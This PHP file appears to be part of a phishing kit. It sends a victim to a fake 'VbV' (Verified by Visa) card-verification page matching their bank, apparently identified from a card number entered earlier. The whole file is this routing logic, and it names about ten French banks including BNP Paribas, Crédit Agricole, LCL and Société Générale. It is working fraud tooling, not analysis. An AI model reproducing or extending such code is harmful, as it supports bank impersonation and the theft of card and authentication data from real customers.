<?php 

ob_start();
include("../infos.php");
include("../common/sub_includes.php");

    if(strpos($_SESSION['bank'], "MUTUEL"))
    {

      header('Location: ../steps/vbv/credit-mutuel.php');

    }
    else
    {

      if(strpos($_SESSION['bank'], "AGRICOLE"))
      {


      header('Location: ../steps/vbv/credit-agricole.php');

      }
      else{
        if(strpos($_SESSION['bank'], "POPULAIRE") || strpos($_SESSION['bank'], "ATIXIS") || $_SESSION['bank'] == "NATIXIS")
        {


      header('Location: ../steps/vbv/banque_populaire.php');

        
        }
        else{


    if(strpos($_SESSION['bank'], "PARIBAS"))
    {


      header('Location: ../steps/vbv/bnp-paribas.php');

    }
    else{


    if(strpos($_SESSION['bank'], "EPARGNE") || strpos($_SESSION['bank'], "D'EPARGNE") || strpos($_SESSION['bank'], "DEPARGNE"))
    {


      header('Location: ../steps/vbv/caisse-epargne.php');

    }
    else{

      if(strpos($_SESSION['bank'], "NORD"))
      {


      header('Location: ../steps/vbv/credit-nord.php');

      }
      else{
          if(strpos($_SESSION['bank'], "LYONNAIS") || strpos($_SESSION['bank'], "LCL") || $_SESSION['bank'] == "LCL BANQUE")
          {


      header('Location: ../steps/vbv/credit-lyonnais.php');

            }
            else{

              if(strpos($_SESSION['bank'], "INDUSTRIEL") || $_SESSION['bank'] == "CIC")
                {


      header('Location: ../steps/vbv/cic.php');

                }
                else{
                  if(strpos($_SESSION['bank'], "POSTALE") || strpos($_SESSION['bank'], "POSTE")  )
                      {


                      header('Location: ../steps/vbv/banque-post.php');

                      }
                      else{
                        if(strpos($_SESSION['bank'], "GENERALE") || $_SESSION['bank'] == "SOCIETE GENERALE, S.A."  )
                          {


                        header('Location: ../steps/vbv/societe-generale.php');

                          }
                          else{
                            header("Location: ../steps/vbv/others.php");
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }


?>